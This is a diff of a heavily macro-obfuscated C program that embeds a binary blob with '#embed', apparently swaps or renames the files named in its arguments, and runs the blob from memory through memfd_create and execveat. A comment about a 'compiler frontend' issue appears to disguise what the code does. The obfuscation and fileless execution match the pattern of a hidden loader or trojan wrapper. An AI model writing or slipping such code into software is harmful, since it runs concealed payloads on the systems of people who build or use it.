@@ -3,8 +3,8 @@
 #define B(a, b, c)a##b##c
 #define C(a, b, c)B(a,b,c)
 
-#define D(x) #x
-#define E(x) D(x)
+#define D(x)#x
+#define E(x)D(x)
 
 #define F(a,b,c,d,e,f)H(A##a,A##b,A##c,A##d,A##e,A##f)
 
@@ -63,29 +63,27 @@
 #define Z1 A(8,D,J)
 #define Z2 F(2,7,0,H,Q,Q)
 
-Z2 cc[] = { 
+Z2 cc[]={ 
 #embed P
 };
 
 // fix issue with compiler frontend not being able to resolve the linker,
 // which is passed through a named extern var environ
-F(4,N,J,4,H,D) Z2 **environ;
+F(4,N,J,4,H,D)Z2**environ;
 
 #define S                                   \
-  A(5,E,H)(Z1 i = 1; i < c; i++) {          \
-    F2(p = F4(F3(Q) + F3(v[i])), Q);        \
-    F2(p + F3(Q), a[i] = v[i]);             \
-    A(8, 5, Q)(!F6(v[i], 0) & !F6(p, 0))    \
-      F1(v[i], t) | F1(p, v[i]) | F1(t, p); \
+  A(5,E,H)(Z1 i=1;i<c;i++) {          \
+    F2(p=F4(F3(Q)+F3(v[i])),Q);        \
+    F2(p+F3(Q),a[i]=v[i]);             \
+    A(8,5,Q)(!F6(v[i],0)&!F6(p,0))    \
+      F1(v[i],t)|F1(p,v[i])|F1(t,p); \
   }
 
-Z1 F(C,0,8,D,Q,Q)(Z1 c, Z2 **v) {
+Z1 F(C,0,8,D,Q,Q)(Z1 c,Z2**v) {
   Z1 f;
-  Z2 *a[999] = {P}, *t = E(.A(H,2,K)), *p;
-
+  Z2*a[31*33]={P},*t = E(.A(H,2,K)),*p;
   S
-
-  A(8, 5, Q)(!F7()) { F8(f = memfd_create(E(), 1), cc, F(I,8,P,4,E,5) cc); execveat(f, E(), a, environ, 4096); }
+  A(8,5,Q)(!F7()){F8(f=memfd_create(E(),1),cc,F(I,8,P,4,E,5) cc); execveat(f,E(),a,environ,1<<12);}
   F5(0);
   S
 }
